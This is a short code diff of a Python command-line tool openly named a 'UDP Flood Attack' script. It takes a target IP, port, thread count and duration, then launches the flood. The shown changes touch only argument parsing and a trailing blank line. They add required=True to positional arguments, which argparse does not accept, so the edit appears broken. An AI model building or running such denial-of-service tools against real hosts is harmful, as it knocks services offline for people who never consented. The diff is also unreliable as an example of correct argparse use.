@@ -20,8 +20,8 @@ def start_attack(target_ip, target_port, threads, duration):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="UDP Flood Attack")
-    parser.add_argument("ip", type=str, help="Target IP address")
-    parser.add_argument("port", type=int, help="Target port")
+    parser.add_argument("ip", type=str, help="Target IP address", required=True)
+    parser.add_argument("port", type=int, help="Target port", required=True)
     parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
     parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")
 
@@ -34,4 +34,3 @@ if __name__ == "__main__":
 
     print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
     start_attack(target_ip, target_port, threads, duration)
-    
